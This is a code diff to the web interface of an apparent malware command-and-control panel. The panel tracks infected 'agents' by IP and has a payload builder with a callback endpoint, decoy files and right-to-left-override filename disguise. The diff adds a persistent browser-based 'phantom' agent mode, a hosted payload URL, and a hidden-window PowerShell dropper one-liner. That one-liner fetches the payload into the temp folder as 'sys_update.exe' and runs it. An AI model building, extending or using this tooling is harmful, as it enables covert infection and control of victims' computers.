@@ -277,6 +277,13 @@
                 <!-- Section 1: Core -->
                 <div class="config-section">
                     <span class="micro-label">01 // Core Configuration</span>
+                    <div class="form-group" style="margin-top: 10px;">
+                        <label>Delivery Vector</label>
+                        <select id="build-mode" onchange="toggleBuildModeUI()">
+                            <option value="binary" selected>High-Performance Binary (EXE for Windows/Linux)</option>
+                            <option value="web">Web-Phantom Link (Persistent Browser-based Agent)</option>
+                        </select>
+                    </div>
                     <div class="builder-grid">
                         <div class="form-group" style="margin-bottom: 0;">
                             <label>Callback Endpoint</label>
@@ -337,6 +344,46 @@
                             Generate Secure Binary
                         </div>
                     </button>
+                </div>
+            </div>
+
+            <!-- Build Success Screen (initially hidden) -->
+            <div id="builder-success" style="display: none;">
+                <div style="text-align: center; padding: 1rem 0;">
+                    <div class="builder-icon-wrapper" style="margin: 0 auto 1.5rem; background: rgba(34, 197, 94, 0.1); border-color: rgba(34, 197, 94, 0.2); color: #22c55e; display: flex; align-items: center; justify-content: center;">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+                    </div>
+                    <h3 style="font-size: 1.4rem; margin-bottom: 0.5rem; color: #fff;">Orchestration Successful</h3>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem;">Payload has been compiled and hosted on the high-speed delivery network.</p>
+                </div>
+
+                <div class="config-section">
+                    <span class="micro-label">Payload Delivery URL (Agent by URL)</span>
+                    <div style="position: relative; margin-top: 10px;">
+                        <input type="text" id="payload-url-display" readonly 
+                               style="width: 100%; padding: 12px 100px 12px 15px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; font-family: 'JetBrains Mono'; color: var(--accent); font-size: 0.85rem;">
+                        <button class="btn-accent" onclick="copyPayloadUrl()" 
+                                style="position: absolute; right: 8px; top: 8px; bottom: 8px; padding: 0 15px; font-size: 0.75rem; border-radius: 6px; box-shadow: none;">
+                            Copy Link
+                        </button>
+                    </div>
+                </div>
+
+                <div class="config-section" style="margin-top: 1.5rem;">
+                    <span class="micro-label">High-Stealth Dropper (One-Liner)</span>
+                    <div style="position: relative; margin-top: 10px;">
+                        <input type="text" id="payload-dropper-display" readonly 
+                               style="width: 100%; padding: 12px 100px 12px 15px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; font-family: 'JetBrains Mono'; color: #f87171; font-size: 0.8rem;">
+                        <button class="btn-accent" onclick="copyDropper()" 
+                                style="position: absolute; right: 8px; top: 8px; bottom: 8px; padding: 0 15px; font-size: 0.75rem; border-radius: 6px; box-shadow: none; background: rgba(248, 113, 113, 0.2); color: #f87171;">
+                            Copy CMD
+                        </button>
+                    </div>
+                </div>
+
+                <div style="margin-top: 2rem; display: flex; gap: 15px;">
+                    <button class="btn-secondary" style="flex: 1; padding: 1rem;" onclick="resetBuilderUI()">Build New</button>
+                    <button class="btn-accent" style="flex: 1; padding: 1rem;" onclick="closeBuilder()">Done</button>
                 </div>
             </div>
         </div>
@@ -455,7 +502,7 @@
                     <span class="status-dot ${
                       isOnline ? "status-online" : "status-offline"
                     }"></span>
-                    ${agent.status.toUpperCase()}
+                    ${agent.status.toUpperCase()} • ${agent.agent_type === 'web' ? 'WEB' : 'BIN'}
                 </div>
                 <div class="agent-meta">
                     <span style="color: var(--accent); font-weight: 600;">IP: ${displayIp}</span>
@@ -931,6 +978,17 @@
               nameSpan.style.color = 'var(--text-muted)';
           }
       }
+      function toggleBuildModeUI() {
+          const mode = document.getElementById('build-mode').value;
+          const maskingSection = document.querySelectorAll('.config-section')[2]; // 03 // Masking
+          if (mode === 'web') {
+              maskingSection.style.opacity = '0.3';
+              maskingSection.style.pointerEvents = 'none';
+          } else {
+              maskingSection.style.opacity = '1';
+              maskingSection.style.pointerEvents = 'all';
+          }
+      }
 
       function toggleRTLO() {
           const toggle = document.getElementById('rtlo-toggle');
@@ -944,6 +1002,7 @@
       }
 
       function openBuilder() {
+          resetBuilderUI();
           document.getElementById('builder-modal-backdrop').style.display = 'flex';
           // Pre-fill URL if possible
           document.getElementById('build-url').value = window.location.origin;
@@ -963,6 +1022,7 @@
           const identity = document.getElementById('build-identity').value;
           const decoyFile = document.getElementById('build-decoy').files[0];
           const rtlo = document.getElementById('build-rtlo').checked;
+          const mode = document.getElementById('build-mode').value;
           
           const statusText = document.getElementById('build-status-text');
           const statusPill = document.getElementById('build-status-pill');
@@ -978,9 +1038,9 @@
           // UI Transition: Building
           btn.disabled = true;
           btn.style.opacity = '0.5';
-          statusPill.innerText = "Compiling";
+          statusPill.innerText = mode === 'web' ? "Deploying" : "Compiling";
           statusPill.classList.add('building-pulse');
-          statusText.innerText = "Generating high-performance node binary. This may take up to 60s...";
+          statusText.innerText = mode === 'web' ? "Hosting phantom agent on cloud high-speed edge nodes..." : "Generating high-performance node binary. This may take up to 60s...";
           progressContainer.style.display = 'block';
           
           // Faux Progress Animation
@@ -998,6 +1058,7 @@
               formData.append('aes_key', key);
               formData.append('identity', identity);
               formData.append('rtlo', rtlo);
+              formData.append('mode', mode);
               if (decoyFile) {
                   formData.append('decoy', decoyFile);
               }
@@ -1020,32 +1081,43 @@
               // Finalize progress
               progressFill.style.width = '100%';
 
-              // Extract filename from header (supporting filename* as well)
-              const disposition = response.headers.get('Content-Disposition');
-              let filename = "dali_agent.exe";
-              if (disposition) {
-                  const match = disposition.match(/filename\*=UTF-8''([^;]+)/i);
-                  if (match) {
-                      filename = decodeURIComponent(match[1]);
-                  } else {
-                      const simpleMatch = disposition.match(/filename="?([^";]+)"?/i);
-                      if (simpleMatch) filename = simpleMatch[1];
-                  }
-              }
+              const data = await response.json();
 
-              const blob = await response.blob();
-              const downloadUrl = window.URL.createObjectURL(blob);
-              const a = document.createElement('a');
-              a.href = downloadUrl;
-              a.download = filename;
-              document.body.appendChild(a);
-              a.click();
-              a.remove();
+              // Finalize progress
+              progressFill.style.width = '100%';
               
               statusPill.innerText = "Success";
               statusPill.style.background = 'rgba(34, 197, 94, 0.1)';
               statusPill.style.color = 'var(--success)';
-              statusText.innerText = "Payload generated and downloaded successfully. Deploy to target nodes.";
+              statusText.innerText = "Payload generated and hosted successfully.";
+
+              // Transition to success screen
+              setTimeout(() => {
+                  document.getElementById('builder-form').style.display = 'none';
+                  const successScreen = document.getElementById('builder-success');
+                  successScreen.style.display = 'block';
+                  
+                  // Format absolute URL
+                  const fullUrl = window.location.origin + data.download_url;
+                  document.getElementById('payload-url-display').value = fullUrl;
+                  
+                  // Format Dropper One-Liner
+                  // powershell -w h (Hidden Window)
+                  // -c (Command)
+                  // iwr (Invoke-WebRequest)
+                  // start (Start-Process)
+                  const dropper = `powershell -w h -c "iwr '${fullUrl}' -o $env:temp\\sys_update.exe; start $env:temp\\sys_update.exe"`;
+                  document.getElementById('payload-dropper-display').value = dropper;
+
+                  // Trigger auto-download ONLY for binary
+                  if (data.mode === 'binary' || !data.mode) {
+                      const a = document.createElement('a');
+                      a.href = data.download_url;
+                      document.body.appendChild(a);
+                      a.click();
+                      a.remove();
+                  }
+              }, 800);
               statusPill.classList.remove('building-pulse');
 
               setTimeout(() => {
@@ -1065,6 +1137,45 @@
               btn.disabled = false;
               btn.style.opacity = '1';
           }
+      }
+
+      function copyPayloadUrl() {
+          const urlInput = document.getElementById('payload-url-display');
+          urlInput.select();
+          document.execCommand('copy');
+          
+          const copyBtn = event.currentTarget;
+          const originalText = copyBtn.innerText;
+          copyBtn.innerText = "Copied!";
+          setTimeout(() => {
+              copyBtn.innerText = originalText;
+          }, 2000);
+      }
+
+      function copyDropper() {
+          const dropperInput = document.getElementById('payload-dropper-display');
+          dropperInput.select();
+          document.execCommand('copy');
+          
+          const copyBtn = event.currentTarget;
+          const originalText = copyBtn.innerText;
+          copyBtn.innerText = "Copied!";
+          setTimeout(() => {
+              copyBtn.innerText = originalText;
+          }, 2000);
+      }
+
+      function resetBuilderUI() {
+          document.getElementById('builder-form').style.display = 'block';
+          document.getElementById('builder-success').style.display = 'none';
+          document.getElementById('build-status-pill').innerText = "Ready for Deployment";
+          document.getElementById('build-status-pill').style.background = 'rgba(56, 189, 248, 0.1)';
+          document.getElementById('build-status-pill').style.color = 'var(--accent)';
+          document.getElementById('build-status-text').innerText = "Finalizing compiler environment. No tasks in queue.";
+          document.getElementById('build-progress-container').style.display = 'none';
+          document.getElementById('build-progress-fill').style.width = '0%';
+          document.getElementById('build-submit-btn').disabled = false;
+          document.getElementById('build-submit-btn').style.opacity = '1';
       }
 
       connectWebSocket();
